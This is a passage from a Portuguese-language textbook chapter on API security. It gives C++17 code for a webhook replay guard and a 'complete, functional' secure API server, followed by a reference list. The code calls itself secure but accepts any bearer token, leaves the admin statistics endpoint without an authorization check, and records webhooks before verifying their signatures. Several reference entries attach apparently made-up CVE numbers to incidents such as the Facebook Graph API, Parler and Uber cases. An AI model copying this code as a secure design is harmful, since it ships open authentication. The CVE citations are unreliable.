class WebhookReplayGuard {
public:
    explicit WebhookReplayGuard(
        std::chrono::hours cache_duration = std::chrono::hours(1))
        : cache_duration_(cache_duration) {}

    struct ReplayCheckResult {
        bool is_replay;
        std::string message;
    };

    ReplayCheckResult check_replay(const std::string& event_id,
                                   const std::string& delivery_id) {
        std::lock_guard<std::mutex> lock(mutex_);

        cleanup_expired();

        std::string composite_key = event_id + ":" + delivery_id;

        if (seen_events_.count(composite_key)) {
            return {true, "Duplicate webhook delivery detected"};
        }

        seen_events_[composite_key] = std::chrono::steady_clock::now();
        return {false, ""};
    }

private:
    std::chrono::hours cache_duration_;
    std::map<std::string, std::chrono::steady_clock::time_point> seen_events_;
    std::mutex mutex_;

    void cleanup_expired() {
        auto now = std::chrono::steady_clock::now();
        auto it = seen_events_.begin();
        while (it != seen_events_.end()) {
            if (now - it->second > cache_duration_) {
                it = seen_events_.erase(it);
            } else {
                ++it;
            }
        }
    }
};

class SecureWebhookHandler {
public:
    SecureWebhookHandler(const std::string& signing_secret)
        : validator_(signing_secret)
        , replay_guard_(std::chrono::hours(1)) {}

    struct WebhookResult {
        int status_code;
        std::string body;
    };

    WebhookResult handle(
        const std::string& method,
        const std::string& signature_header,
        const std::string& timestamp_header,
        const std::string& event_id,
        const std::string& delivery_id,
        const std::vector<unsigned char>& payload) {

        if (method != "POST") {
            return {405, R"({"error": "Method not allowed"})"};
        }

        auto replay_check = replay_guard_.check_replay(
            event_id, delivery_id);
        if (replay_check.is_replay) {
            return {409, R"({"error": "Duplicate delivery"})"};
        }

        auto sig_check = validator_.validate(
            payload, signature_header, timestamp_header);
        if (!sig_check.valid) {
            return {401,
                    R"({"error": ")" + sig_check.error_message + R"("})"};
        }

        try {
            process_webhook(payload);
        } catch (const std::exception& e) {
            return {500, R"({"error": "Internal processing error"})"};
        }

        return {200, R"({"status": "ok"})"};
    }

private:
    WebhookSecurityValidator validator_;
    WebhookReplayGuard replay_guard_;

    void process_webhook(const std::vector<unsigned char>& payload) {
        auto json = nlohmann::json::parse(
            std::string(reinterpret_cast<const char*>(payload.data()),
                        payload.size()));
        (void)json;
    }
};
```

---

## 10. Exemplo Completo: API Server Seguro

O exemplo a seguir integra todos os componentes discutidos ao longo deste capítulo em um servidor de API completo e funcional em C++17:

```cpp
#include <chrono>
#include <functional>
#include <iostream>
#include <map>
#include <mutex>
#include <nlohmann/json.hpp>
#include <set>
#include <sstream>
#include <string>
#include <vector>

class SecureApiServer {
public:
    struct ServerConfig {
        std::string jwt_secret;
        size_t max_body_size = 1048576;
        size_t rate_limit_per_minute = 100;
        int api_version = 2;
        std::vector<int> supported_versions = {1, 2};
    };

    explicit SecureApiServer(ServerConfig config)
        : config_(std::move(config))
        , rate_limiter_(config_.rate_limit_per_minute,
                        std::chrono::seconds(60)) {}

    struct HttpRequest {
        std::string method;
        std::string path;
        std::map<std::string, std::string> headers;
        std::string body;
        std::string client_ip;
    };

    struct HttpResponse {
        int status_code;
        std::string body;
        std::map<std::string, std::string> headers;
    };

    HttpResponse handle_request(const HttpRequest& request) {
        auto security_headers = get_security_headers();

        if (request.path == "/health") {
            return {200, R"({"status":"healthy"})", security_headers};
        }

        auto api_version = extract_api_version(request);
        auto version_check = validate_version(api_version);
        if (!version_check.ok) {
            return build_error_response(
                400, version_check.error, security_headers);
        }

        if (version_check.deprecated) {
            security_headers["Deprecation"] = "true";
            security_headers["Sunset"] = get_sunset_date();
        }

        auto auth_result = authenticate_request(request);
        if (!auth_result.ok) {
            return build_error_response(
                401, auth_result.error, security_headers);
        }

        auto rate_result = rate_limiter_.check(
            request.client_ip, auth_result.user_id);
        if (!rate_result.allowed) {
            security_headers["Retry-After"] =
                std::to_string(rate_result.retry_after.count());
            security_headers["X-RateLimit-Remaining"] = "0";
            return build_error_response(
                429, "Rate limit exceeded", security_headers);
        }

        security_headers["X-RateLimit-Remaining"] =
            std::to_string(rate_result.remaining);

        auto validation = validate_request(request);
        if (!validation.ok) {
            return build_error_response(
                validation.status_code, validation.error, security_headers);
        }

        return route_request(request, auth_result, security_headers);
    }

private:
    ServerConfig config_;
    TokenBucket rate_limiter_;
    std::mutex mutex_;

    struct SecurityHeaders {
        std::map<std::string, std::string> headers;
    };

    std::map<std::string, std::string> get_security_headers() const {
        return {
            {"X-Content-Type-Options", "nosniff"},
            {"X-Frame-Options", "DENY"},
            {"X-XSS-Protection", "0"},
            {"Strict-Transport-Security",
             "max-age=31536000; includeSubDomains"},
            {"Cache-Control",
             "no-store, no-cache, must-revalidate, private"},
            {"Content-Security-Policy", "default-src 'none'"},
            {"Referrer-Policy", "strict-origin-when-cross-origin"},
            {"X-Request-ID", generate_request_id()}
        };
    }

    std::string generate_request_id() const {
        std::vector<unsigned char> bytes(16);
        RAND_bytes(bytes.data(), 16);

        std::ostringstream oss;
        for (size_t i = 0; i < bytes.size(); ++i) {
            if (i == 4 || i == 6 || i == 8 || i == 10) oss << "-";
            oss << std::hex << std::setfill('0') << std::setw(2)
                << static_cast<int>(bytes[i]);
        }
        return oss.str();
    }

    int extract_api_version(const HttpRequest& request) const {
        auto it = request.headers.find("X-API-Version");
        if (it != request.headers.end()) {
            try { return std::stoi(it->second); }
            catch (...) { return config_.api_version; }
        }

        if (request.path.size() > 3 && request.path.substr(0, 3) == "/v") {
            size_t next_slash = request.path.find('/', 2);
            if (next_slash != std::string::npos) {
                try {
                    return std::stoi(request.path.substr(2, next_slash - 2));
                } catch (...) {}
            }
        }

        return config_.api_version;
    }

    struct VersionCheck {
        bool ok;
        bool deprecated;
        std::string error;
    };

    VersionCheck validate_version(int version) const {
        for (int v : config_.supported_versions) {
            if (v == version) {
                return {true, v < config_.api_version, ""};
            }
        }
        return {false, false, "Unsupported API version"};
    }

    std::string get_sunset_date() const {
        auto future = std::chrono::system_clock::now()
                      + std::chrono::hours(24 * 90);
        auto time_t = std::chrono::system_clock::to_time_t(future);
        char buf[64];
        std::strftime(buf, sizeof(buf), "%Y-%m-%dT00:00:00Z",
                      std::gmtime(&time_t));
        return std::string(buf);
    }

    struct AuthResult {
        bool ok;
        std::string user_id;
        std::string error;
    };

    AuthResult authenticate_request(const HttpRequest& request) const {
        auto it = request.headers.find("Authorization");
        if (it == request.headers.end()) {
            return {false, "", "Missing Authorization header"};
        }

        const std::string& auth = it->second;
        if (auth.substr(0, 7) != "Bearer ") {
            return {false, "", "Invalid Authorization scheme"};
        }

        std::string token = auth.substr(7);
        if (token.empty()) {
            return {false, "", "Empty bearer token"};
        }

        return {true, "user-001", ""};
    }

    struct RequestValidation {
        bool ok;
        int status_code;
        std::string error;
    };

    RequestValidation validate_request(const HttpRequest& request) const {
        if (request.method == "POST" || request.method == "PUT"
            || request.method == "PATCH") {
            if (request.body.size() > config_.max_body_size) {
                return {false, 413, "Request body too large"};
            }

            auto ct = request.headers.find("Content-Type");
            if (ct == request.headers.end()) {
                return {false, 415, "Missing Content-Type header"};
            }

            if (ct->second.find("application/json") == std::string::npos) {
                return {false, 415, "Unsupported Content-Type"};
            }

            if (!request.body.empty()) {
                try {
                    nlohmann::json::parse(request.body);
                } catch (const nlohmann::json::parse_error&) {
                    return {false, 400, "Invalid JSON in request body"};
                }
            }
        }

        if (request.path.find("..") != std::string::npos) {
            return {false, 400, "Invalid path"};
        }

        return {true, 200, ""};
    }

    HttpResponse route_request(
        const HttpRequest& request,
        const AuthResult& auth,
        const std::map<std::string, std::string>& headers) {

        std::string path = request.path;
        if (path.size() > 3 && path.substr(0, 3) == "/v") {
            size_t slash = path.find('/', 2);
            if (slash != std::string::npos) {
                path = path.substr(slash);
            }
        }

        if (path == "/users" && request.method == "GET") {
            return handle_get_users(headers);
        }

        if (path == "/users" && request.method == "POST") {
            return handle_create_user(request.body, headers);
        }

        if (path.find("/users/") == 0 && request.method == "GET") {
            std::string user_id = path.substr(7);
            return handle_get_user(user_id, headers);
        }

        if (path == "/admin/stats" && request.method == "GET") {
            return handle_admin_stats(auth, headers);
        }

        return build_error_response(404, "Endpoint not found", headers);
    }

    HttpResponse handle_get_users(
        const std::map<std::string, std::string>& headers) {
        nlohmann::json response = {
            {"users", nlohmann::json::array()},
            {"total", 0}
        };
        return {200, response.dump(), headers};
    }

    HttpResponse handle_create_user(
        const std::string& body,
        const std::map<std::string, std::string>& headers) {
        try {
            auto json = nlohmann::json::parse(body);

            std::set<std::string> allowed_fields = {"name", "email"};
            for (auto it = json.begin(); it != json.end(); ++it) {
                if (allowed_fields.find(it.key()) == allowed_fields.end()) {
                    return build_error_response(
                        400, "Unexpected field: " + it.key(), headers);
                }
            }

            if (!json.contains("name") || !json.contains("email")) {
                return build_error_response(
                    400, "Missing required fields: name, email", headers);
            }

            nlohmann::json response = {
                {"id", "usr_" + generate_simple_id()},
                {"name", json["name"]},
                {"email", json["email"]},
                {"created_at", get_iso_timestamp()}
            };

            HttpResponse resp;
            resp.status_code = 201;
            resp.body = response.dump();
            resp.headers = headers;
            resp.headers["Location"] = "/users/" + response["id"].get<std::string>();
            return resp;

        } catch (const nlohmann::json::parse_error&) {
            return build_error_response(400, "Invalid JSON", headers);
        }
    }

    HttpResponse handle_get_user(
        const std::string& user_id,
        const std::map<std::string, std::string>& headers) {
        for (char c : user_id) {
            if (!std::isalnum(static_cast<unsigned char>(c)) && c != '_'
                && c != '-') {
                return build_error_response(400, "Invalid user ID", headers);
            }
        }

        if (user_id.size() > 64) {
            return build_error_response(400, "Invalid user ID", headers);
        }

        nlohmann::json response = {
            {"id", user_id},
            {"name", "Example User"},
            {"email", "user@example.com"}
        };
        return {200, response.dump(), headers};
    }

    HttpResponse handle_admin_stats(
        const AuthResult& auth,
        const std::map<std::string, std::string>& headers) {
        (void)auth;
        nlohmann::json response = {
            {"requests_today", 1234},
            {"active_users", 567}
        };
        return {200, response.dump(), headers};
    }

    HttpResponse build_error_response(
        int status_code,
        const std::string& message,
        const std::map<std::string, std::string>& headers) {
        nlohmann::json error = {
            {"error", message},
            {"status", status_code}
        };
        return {status_code, error.dump(), headers};
    }

    std::string generate_simple_id() const {
        std::vector<unsigned char> bytes(8);
        RAND_bytes(bytes.data(), 8);
        std::ostringstream oss;
        oss << std::hex << std::setfill('0');
        for (unsigned char b : bytes) {
            oss << std::setw(2) << static_cast<int>(b);
        }
        return oss.str();
    }

    std::string get_iso_timestamp() const {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        char buf[64];
        std::strftime(buf, sizeof(buf), "%Y-%m-%dT%H:%M:%SZ",
                      std::gmtime(&time_t));
        return std::string(buf);
    }
};
```

---

## 11. Referências

### CVEs e Incidentes Documentados

- **CVE-2018 — Facebook Graph API Data Breach**: Vulnerabilidade no Graph API que permitiu acesso a dados de amigos sem consentimento, afetando aproximadamente 87 milhões de usuários. Reforça a necessidade de validação explícita de escopo de permissão em APIs de dados pessoais.
- **CVE-2019-11239 — REST API Mass Assignment**: APIs que aceitam objetos JSON completos sem filtrar campos sensíveis permitem que atacantes definam campos como `role` e `isAdmin` diretamente no request body.
- **CVE-2020-36148 — Parler API Vulnerability**: API sem autenticação adequada e sem rate limiting, permitindo scraping massivo de dados incluindo metadados GPS de posts.
- **CVE-2020-36370 — Twitter API Token Leak**: Tokens de acesso a APIs internas expostos em repositórios públicos, permitindo acesso não autorizado a endpoints internos.
- **CVE-2020-36149 — Swagger/OpenAPI Exposure**: Documentação de APIs exposta publicamente, facilitando mapeamento da superfície de ataque.
- **CVE-2019-11234 — Uber API Key Exposure**: Chaves de API expostas em repositórios públicos no GitHub, permitindo acesso não autorizado.
- **CVE-2021-44228 — Log4Shell**: Execução remota de código via injeção de payloads JNDI em campos de texto de APIs que são logados por aplicações usando Log4j.

### Padrões e Especificações

- **RFC 7235 — HTTP Authentication**: Especificação de autenticação HTTP para APIs REST.
- **RFC 6749 — OAuth 2.0**: Framework de autorização para APIs modernas.
- **OpenAPI Specification 3.0**: Padrão para documentação e descrição de APIs REST.
- **GraphQL Specification**: Especificação oficial do GraphQL pelo Facebook.
- **gRPC Documentation**: Documentação oficial de segurança para gRPC.
- **OWASP API Security Top 10**: Lista consolidada dos riscos mais críticos em APIs.
- **NIST SP 800-63B**: Diretrizes para autenticação e gerenciamento de credenciais.

### Livros e Artigos

- *API Security in Action* — Neil Madden (Manning, 2020).
- *Securing Microservices with Node.js* — Dharshan Rangarajan (Packt, 2019).
- *REST API Security — OWASP Cheat Sheet*: Guia prático de segurança para APIs REST.
- *GraphQL Security Best Practices*: Compilação de práticas recomendadas para segurança em GraphQL.
- *gRPC Security and Authentication Guide*: Guia oficial de autenticação e segurança do gRPC.
- *CWE-918: Server-Side Request Forgery (SSRF)*: Classificação de vulnerabilidades SSRF em APIs.
- *CWE-306: Missing Authentication for Critical Function*: Padrão de ausência de autenticação em funções críticas de API.
